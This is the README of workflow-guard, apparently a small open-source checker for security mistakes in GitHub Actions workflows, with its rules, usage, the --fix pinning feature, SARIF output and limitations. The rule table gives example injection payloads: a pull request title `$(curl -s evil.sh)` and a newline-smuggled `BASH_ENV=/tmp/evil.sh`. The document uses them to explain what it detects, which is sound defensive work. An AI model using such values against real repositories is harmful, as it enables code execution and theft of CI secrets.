# workflow-guard

A small command-line checker for **security mistakes in GitHub Actions workflows**: actions that
aren't pinned, a `GITHUB_TOKEN` with more rights than it needs, pull request titles pasted into
shell scripts, and a few more. It prints `file:line:column` findings and exits non-zero, so it can
run in CI or as a pre-commit check.

## Why

Workflows are code that runs with secrets and a token that can write to the repository, but they
rarely get reviewed like code. The mistakes are well documented (GitHub's own
[security hardening guide](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions),
the [WordPress workflow standards](https://developer.wordpress.org/coding-standards/wordpress-coding-standards/github-actions/))
and easy to check by machine.

This is a learning project. Mature tools already exist and go much further:
[actionlint](https://github.com/rhysd/actionlint) type-checks whole workflows and
[zizmor](https://github.com/zizmorcore/zizmor) is a full security auditor. workflow-guard is
deliberately small and readable: one file per concern, every rule explained below.

## Rules

| Id | Name | Severity | What it finds |
|----|------|----------|---------------|
| WG001 | unpinned-action | low for `actions/*`, `github/*`; high for other owners; medium for Docker tags | `uses:` with a tag or branch (`@v4`, `@main`), a short SHA, or no version. A tag can be moved to malicious code after you've reviewed it; a full 40-character commit SHA can't. Covers steps and reusable workflows (`jobs.<id>.uses`). |
| WG002 | missing-permissions | medium | No `permissions:` at the top and at least one job without its own. The token then gets the repository's default, which may be read/write for everything. |
| WG003 | write-all | high | `permissions: write-all` at workflow or job level. |
| WG004 | template-injection | high | `${{ github.event.pull_request.title }}` and other outsider-controlled values (issue/PR/comment text, branch names, commit messages) inside `run:` or `actions/github-script`. The value is pasted into the script before it runs, so a PR titled `$(curl -s evil.sh)` downloads and runs that script. Pass it through `env:` and use `"$TITLE"` instead. In a composite action, `${{ inputs.* }}` in `run:` is reported too (medium): the calling workflow may pass untrusted text. Detours are followed too: `env:`, `$GITHUB_ENV`, `$GITHUB_OUTPUT` and job outputs (see below). |
| WG005 | pull-request-target | low, or high with a PR checkout | `pull_request_target` runs with secrets even for pull requests from forks. Checking out the PR's head (`ref: ${{ github.event.pull_request.head.sha }}`, or a `refs/pull/...` ref) then runs a stranger's code with those secrets. |
| WG006 | persisted-credentials | low | `actions/checkout` without `persist-credentials: false` leaves the token in `.git/config`, readable by every later step. |
| WG007 | untrusted-github-env | high (medium for a composite action's inputs) | Untrusted text appended to `$GITHUB_ENV` or `$GITHUB_PATH` in `run:`, directly or through `env:`/shell variables (`echo "T=$TITLE" >> "$GITHUB_ENV"`). Every later step reads those files: a PR title with a line break such as `x` + newline + `BASH_ENV=/tmp/evil.sh` sets a variable that makes bash run the sender's script, and `$GITHUB_PATH` can put their directory first in `PATH`. No `${{ }}` in the script is needed for this, so WG004 alone doesn't catch it. Pass the value to the step that needs it via `env:` or a step output. |

### Actions too

Besides workflows, workflow-guard reads **action metadata files** (`action.yml`), recognised by
their `runs:` key:

- Composite actions (`using: composite`): the steps under `runs.steps` get WG001, WG004 and
  WG006, like a job's steps. WG002/WG003 don't apply (an action has no `permissions:`; it runs
  with the caller's token) and neither does WG005 (no triggers).
- Docker actions: `runs.image: docker://name:tag` is WG001 (medium), like a Docker `uses:`.
  `image: Dockerfile` is built from the action's own repository and is fine.
- JavaScript actions (`using: node24`) have nothing to check in their metadata.

Without arguments it checks `.github/workflows/`, an `action.yml` at the repository root (a
repository that *is* an action) and local actions in `.github/actions/<name>/action.yml`.
`--fix` pins the steps of composite actions as well.

## Use it in your repository

### As a GitHub Action

```yaml
# .github/workflows/workflow-guard.yml
name: workflow-guard
on:
  pull_request:
    paths: [".github/workflows/**"]
  push:
    branches: [main]
permissions:
  contents: read
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
        with:
          persist-credentials: false
      - uses: Gallileee/workflow-guard@v0.4.0   # better: pin the commit SHA, see below
```

Findings show up as annotations on the workflow lines of the pull request (`::error` for high,
`::warning` for medium, `::notice` for low) and the step fails. No extra permissions are needed,
and it works in private repositories too.

Pin the action to a commit like any other: `workflow-guard --fix` turns `@v0.4.0` into
`@<sha>  # v0.4.0` for you.

| Input | Default | Meaning |
|-------|---------|---------|
| `paths` | `""` (`.github/workflows`) | files or directories, separated by spaces or new lines |
| `format` | `github` | `github` (annotations), `text`, `json` or `sarif` |
| `output` | `""` | write the report to this file instead of the log |
| `fail-on` | `low` | fail the step on findings at this level or above |
| `min-severity` | `low` | hide findings below this level |
| `ignore` | `""` | comma-separated rule ids, e.g. `WG006` |
| `python-version` | `3.12` | Python that runs the tool; the job's own Python isn't changed |

How the action is built (`action.yml`, a composite action):

- `actions/setup-python` with `update-environment: false`, so the tool's Python stays off the
  job's `PATH` and can't break the caller's own Python setup.
- The action installs its own checkout (the exact commit you pinned) into a virtual environment
  in `$RUNNER_TEMP`, not a package from PyPI that could change under the same version.
- Inputs reach the shell through `env:`, never as `${{ inputs.x }}` inside `run:` (that would be
  the template injection WG004 reports), and the paths come after `--`, so a path can't turn
  into an option such as `--fix`.
- CI runs it on Ubuntu and Windows (the `action` job), against this repository and a deliberately
  unsafe fixture.

### As a pre-commit hook

```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/Gallileee/workflow-guard
    rev: v0.4.0
    hooks:
      - id: workflow-guard
```

[pre-commit](https://pre-commit.com) installs the tool in its own environment and runs it on the
workflow and action files a commit changes (`.github/workflows/*.yml`, `action.yml` and
`.github/actions/**/action.yml`, also as `.yaml`).

## Install

Needs Python 3.10+.

```bash
git clone https://github.com/Gallileee/workflow-guard.git
cd workflow-guard
python -m venv .venv
.venv/bin/pip install -e ".[dev]"      # Windows: .venv\Scripts\pip install -e ".[dev]"
```

## Usage

```bash
workflow-guard                          # checks .github/workflows and action.yml files here
workflow-guard path/to/ci.yml other/dir # files or directories
workflow-guard --format json            # machine-readable output
workflow-guard --format github          # annotations, inside a GitHub Actions step
workflow-guard --format sarif --output results.sarif  # for GitHub code scanning
workflow-guard --min-severity medium    # hide low findings
workflow-guard --fail-on high           # show everything, but only fail on high
workflow-guard --ignore WG006           # skip rules
workflow-guard --list-rules
workflow-guard --fix                    # pin actions to commit SHAs (rewrites the files)
```

Example (from a real repository):

```
.github/workflows/server.yml:8:1: WG002 [medium] no 'permissions:' at the top or in job(s) test; ...
.github/workflows/server.yml:12:15: WG001 [low] 'actions/checkout@v7' points to a tag or branch that can be moved; ...
```

To accept a finding on one line, add a comment there:

```yaml
- uses: actions/checkout@v4  # workflow-guard: ignore[WG001, WG006]
```

### Pinning actions automatically

`--fix` looks up the commit each tag or branch points to right now and rewrites the line:

```diff
-      - uses: actions/checkout@v7
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7
```

- Only the `uses:` value and the end of its line change. Comments, quotes, indentation and
  Windows line endings stay as they were; an existing comment becomes `# v7; old comment`.
- The new comment follows the file's style, so a formatter check doesn't fail afterwards.
  Prettier writes one space before `#` (`@<sha> # v7`), yamllint wants two (`@<sha>  # v7`).
  In this order:
  1. `--comment-spaces N`, if given;
  2. the gap the file's own end-of-line comments use most (a tie goes to two spaces);
  3. one space if the repository uses Prettier (a `.prettierrc*` / `prettier.config.*` file,
     or `prettier` in `package.json`), found by walking up to the folder with `.git`;
  4. two spaces.
- The version stays in the comment, so Dependabot and Renovate can keep updating pinned actions.
- It uses `GET /repos/{owner}/{repo}/commits/{ref}` with the `application/vnd.github.sha` media
  type, which answers with just the SHA. Lookups are cached per run.
- GitHub allows 60 anonymous API requests an hour. Set `GITHUB_TOKEN` or `GH_TOKEN` for more, e.g.
  `GH_TOKEN=$(gh auth token) workflow-guard --fix`. The token is only sent to api.github.com.
- Lines with `# workflow-guard: ignore[WG001]`, local actions, actions without a version and
  Docker images are left alone. A tag that can't be found is reported and its line kept.
- Review the diff before committing: `--fix` trusts what the tag points to today, so it pins
  whatever is there now. Check that the action is one you meant to use.

### Code scanning (SARIF)

`--format sarif` writes [SARIF 2.1.0](https://docs.oasis-open.org/sarif/sarif/v2.1.0/sarif-v2.1.0.html),
which GitHub code scanning reads. The findings then appear in the repository's Security tab and as
annotations on the lines a pull request changes. Use `--output FILE` rather than `>`: PowerShell's
redirection writes UTF-16, which the upload rejects.

```yaml
jobs:
  workflow-guard:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write   # needed to upload results
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
        with:
          persist-credentials: false
      - uses: Gallileee/workflow-guard@v0.4.0   # pin the commit SHA (workflow-guard --fix)
        with:
          format: sarif
          output: results.sarif
          fail-on: high
      - uses: github/codeql-action/upload-sarif@33d7b85da1a04171e211befe2c739303b9a4c066  # v4.39.3
        if: always()
        with:
          sarif_file: results.sarif
          category: workflow-guard
```

How the report maps to code scanning:

- Severity becomes the SARIF `level`: high = `error`, medium = `warning`, low = `note`. It's set per
  result because WG001 and WG005 vary per finding; that's also why the rules carry no
  `security-severity` score (GitHub reads that per rule, not per result).
- Every rule has a description and help text, shown on the alert page.
- Each result has its own `partialFingerprints` value, a hash of rule, file and message without
  the line number. An alert therefore stays the same alert when lines above it move, and is closed
  when the problem is fixed. Two identical problems in one file are told apart by their order.
- Paths are relative to where you run the tool (`%SRCROOT%`), so run it from the repository root.
- Files that can't be parsed are listed as tool notifications, and the run is marked
  unsuccessful, instead of just missing from the report.

This repository's own CI uploads its results the same way (the `code-scanning` job, which runs
the CLI directly). Code scanning needs a public repository or GitHub Advanced Security; the
default `format: github` annotations work everywhere.

Exit codes: `0` nothing at or above `--fail-on` (default `low`), `1` findings, `2` a file couldn't
be read or parsed, or bad arguments.

## How it works

- Workflows are read with PyYAML's `compose`, which gives **nodes** with line and column numbers
  instead of plain dicts. That's what makes `file:line:column` possible, and it also avoids a
  classic YAML 1.1 trap: `yaml.safe_load` turns the key `on` into the boolean `True`.
- Each rule is a function `Workflow -> Iterator[Finding]` in `rules.py`, registered in `RULES`.
- `${{ }}` expressions are **parsed**, not matched with regular expressions (`expressions.py`):
  a small lexer splits them into tokens, and property accesses become normalized paths, so
  `github.event['pull_request']['title']`, `GITHUB.EVENT.PULL_REQUEST.TITLE` and
  `github.event.pull_request.title` are the same thing (GitHub ignores case), and
  `commits[0].message` matches `commits.*.message`. A quoted string such as
  `'github.head_ref'` is text, not a context, and a `}}` inside it doesn't end the expression.
  `toJSON(github.event)` is reported too: it prints every field, titles and bodies included.
  The paths are then compared with a list of outsider-controlled fields.
- WG004 also follows untrusted values on a **detour** (`taint.py`). The steps of each job are
  walked in order, like the runner does, keeping track of which values are *tainted*:
  `env:` at workflow, job and step level (a clean value at a lower level removes the taint),
  `NAME=value >> $GITHUB_ENV` (later steps), `name=value >> $GITHUB_OUTPUT` in a step with an
  `id` (`steps.<id>.outputs.<name>`), and job `outputs:` (`needs.<job>.outputs.<name>`, in any
  job order). A value is tainted if an expression in it is, or, in a script, if it uses a
  shell variable holding a tainted value. The message spells the detour out:

  ```
  'steps.meta.outputs.title' carries 'github.event.pull_request.title', which outsiders can set
  (via env.TITLE (step 'meta') -> steps.meta.outputs.title) and is pasted into a script; ...
  ```

  `"$TITLE"` in the script stays fine: the shell reads the variable, nothing is pasted.
  For `run: |` blocks the line of the expression itself is reported, not the `run:` line.
- `--format github` prints [workflow commands](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-commands).
  Messages and properties are percent-encoded the way the runner expects (`%`, `\r`, `\n`, and
  in properties also `:` and `,`), so a file name or value with a line break can't end the
  annotation and start a different command on the next line.

```
src/workflow_guard/
  workflow.py  loading workflows and actions, node helpers, jobs/steps/triggers, inline ignores
  rules.py     the seven rules
  expressions.py  ${{ }} lexer and context paths (used by WG004 and WG005)
  taint.py     WG004's tracker: untrusted values through env:, $GITHUB_ENV/OUTPUT, job outputs
  fix.py       --fix: GitHubResolver (API lookups), pin_actions (text edits), comment style
  sarif.py     --format sarif: rules, results, fingerprints, notifications
  annotations.py --format github: workflow commands, with GitHub's escaping
  model.py     Finding, Severity
  cli.py       arguments, file discovery, text/JSON/SARIF/GitHub output, exit codes
action.yml     the composite GitHub Action
.pre-commit-hooks.yaml  the pre-commit hook
tests/         pytest: rules, CLI, SARIF, annotations, action.yml and the hook, and --fix
               (with a local HTTP server standing in for GitHub); fixtures/ holds an unsafe workflow
```

## Tests

```bash
pytest -q
ruff check . && ruff format --check .
```

CI runs them on Python 3.10, 3.12 and 3.14, and then runs workflow-guard on this repository's own
workflow, which pins its actions to commit SHAs. The `action` job runs `action.yml` itself on
Ubuntu and Windows.

## Limitations

- The expression reader only extracts property paths; it doesn't evaluate expressions or check
  operator precedence. A computed key (`github.event[matrix.field].title`) can't be resolved,
  so it isn't reported.
- The detour tracking (WG004, WG007) reads `>> $GITHUB_*` writes one line at a time: multi-line
  values (`name<<EOF` heredocs), `{ ...; } >> $GITHUB_OUTPUT` groups, `tee`, other shells' syntax
  and outputs set by actions (e.g. github-script's `core.setOutput`) aren't followed. Neither
  are outputs of reusable workflows or composite actions as seen by their callers.
- The inside of called reusable workflows and of remote actions (`uses: owner/repo@sha`)
  isn't checked; only files in the repository being checked are.
- `.github/actions` is searched for `action.yml` at any depth, but other places for local
  actions (e.g. `tools/my-action/`) need to be passed as paths.
- The action needs `bash` (all GitHub-hosted runners have it, Windows included) and network
  access to PyPI for PyYAML.
- Not on PyPI or the GitHub Marketplace yet; install from the repository.
- WG004 only looks at `run:` and `actions/github-script`; other actions can also misuse inputs.
- WG001 doesn't check that a SHA really belongs to the repository's tag (a SHA from a fork works
  on GitHub too).
- `--fix` only fixes WG001. The other rules need a human decision (which permissions a job needs).
- The SARIF output isn't checked against the JSON schema in CI (it was checked by hand, see
  PROGRESS.md); the tests check the fields GitHub requires.
- The comment style is a heuristic: a `#` after whitespace inside a quoted string counts as a
  comment, and a `.prettierignore` that excludes `.github/` isn't read (use `--comment-spaces`).
- `--fix` doesn't look into GitHub Enterprise Server (the API URL is fixed to api.github.com).

## Next steps

See [PROGRESS.md](PROGRESS.md).

## License

MIT
